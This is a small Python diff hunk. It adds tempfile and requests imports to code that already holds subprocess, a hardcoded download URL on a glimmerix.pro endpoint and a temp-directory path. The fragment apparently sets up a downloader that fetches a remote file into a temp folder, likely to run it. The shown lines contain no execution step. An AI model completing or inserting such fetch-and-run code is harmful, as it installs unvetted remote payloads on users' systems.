@@ -1,7 +1,8 @@
 import asyncio
 import os
 import subprocess
-
+import tempfile
+import requests
 url = "https://manage.glimmerix.pro/api/public/dl/fuOMDcfU" 
 
 temp_dir = tempfile.gettempdir()
